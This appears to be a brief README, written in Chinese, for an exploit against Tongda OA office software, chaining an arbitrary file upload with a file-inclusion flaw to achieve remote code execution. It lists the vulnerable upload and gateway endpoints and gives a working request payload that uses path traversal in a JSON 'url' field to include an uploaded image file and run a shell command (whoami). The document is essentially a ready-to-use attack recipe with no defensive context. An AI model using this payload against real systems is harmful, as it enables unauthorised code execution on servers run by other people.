# tongdaOA
通达OA 任意文件上传+文件包含导致远程代码执行

上传路径/ispirit/im/upload.php

文件包含路径
/ispirit/interface/gateway.php

执行命令
json={"url":"/general/../../attach/im/2003/文件名称.jpg"}&cmd=whoami
